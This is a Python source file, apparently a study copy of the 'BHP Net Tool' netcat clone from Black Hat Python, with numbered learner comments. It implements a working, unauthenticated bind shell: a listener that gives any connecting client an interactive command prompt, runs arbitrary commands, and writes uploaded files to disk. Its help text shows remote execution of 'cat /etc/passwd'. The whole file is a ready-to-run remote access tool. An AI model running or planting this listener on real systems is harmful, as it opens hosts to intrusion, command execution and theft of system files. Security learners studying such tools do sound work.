import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    # 1) Runs com on local os -> returns the output
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)
    return output.decode()

class NetCat:
    # 1) Initialize NetCat object with the arguments from the command line and the buffer
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        # 2) Create the socket object
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            # 3) if we are setting up a listener
            self.listener()
        else:
            # 4) Not setting up a listener, #sendit
            self.send()
    
    def send(self):
        # 1) Connect to the target and port
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        
        # 2) Try-Catch block so we can manually close the connection with Ctrl+C
        try:
            # 3) Next, we start a loop
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        # 4) if there is no more data, we break out of the loop
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    # 5) Print response data, pause to get interactive input, send that input, continue the loop
                    self.socket.send(buffer.encode())
        # 6) This loop will continue until the KeyboardInterrupt occurs (CTRL+C) which closes the socket.
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def listener(self):
        # 1) binds to the target and port 
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        # 2) starts listening in a loop
        while True:
            client_socket, _ = self.socket.accept()
            # 3) passing the connected socket to the handle method
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()
    
    def handle(self, client_socket):
        # 1) handle passes commands to execute and sends output through the socket
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        # 2) upload? -> set up a loop to listen for bits on the socket and recieve the data until there is no more coming. Write it to a file.
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        # 3) to set up a shell set up a loop. send a prompt to the sender, wait for a command string to come back, use the execute function to run the command. Return the output of the command to the sender.
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()




if __name__ == '__main__':
    # 1) Invoke command line interface using argparse
    # 2) Example usage when --help is used
    parser = argparse.ArgumentParser(description='BHP Net Tool',formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example:
    netcat.py -t 192.168.1.108 -p 5555 -l -c
    netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt
    netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"
    echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135
    netcat.py -t 192.168.1.108 -p 5555
    '''))
    # 3) six arguments that specify how we want the program to behave
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    
    # 4) IF we are setting it up as a listener
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()

